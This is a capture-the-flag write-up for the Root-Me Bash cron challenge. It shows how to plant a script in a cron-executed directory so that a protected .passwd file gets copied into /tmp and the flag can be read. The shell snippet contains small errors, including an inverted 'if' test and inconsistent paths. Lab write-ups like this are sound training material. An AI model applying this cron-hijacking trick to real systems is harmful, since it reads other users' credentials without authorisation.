// Link to the challenge: https://www.root-me.org/en/Challenges/App-Script/Bash-cron
// Run the 'cat' command to display the ch4 bash file
$ cat ch4
// In this file we see:
Output of the command 'crontab -l' run as app-script-ch4-cracked

// Use 'ls -la' to see the permission of '.passwd' file:
$ ls -la .passwd
-r--r----- 1 app-script-ch4-cracked app-script-ch4-cracked 16 Jun  1  2013 .passwd

// We can read the '.passwd' file with 'app-script-ch4-cracked' account.
// Furthermore, look at the script:
ls -1a "${wdir}" | while read task; do
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
        timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
    fi
    rm -f "${PWD}/${wdir}${task}"
done
// if the condition is true (-f: TRUE if file exists and is a regulary file, -a: AND, -x: TRUE if file exit and is a executable file),
// the file in '${PWD}/cron.d/' will be executed by bash.
// So, we can read the '.passwd' using the script in {task}.
// By creating the script in cron.d directory, we are able to read the '.passwd' then write it into a file in the '/tmp' directory
$ vim crom.d/ch4/decode.sh
if[ -e "/tmp/ch4" ]; then
	mkdir -m 777 "/tmp/ch4"
fi
/bin/cat /challenge/app-script/ch4/.passwd > /tmp/ch4/result.txt

// Change the permission of "decode.sh"
$ chmod o+rx cron.d/decode.sh
// Run the script ch4, then waiting for the crontab. Check the password in the '/tmp/ch4/result.txt' to capture the flag:
$ ./ch4
$ cat /tmp/ch4/result.txt
==> we get the flag
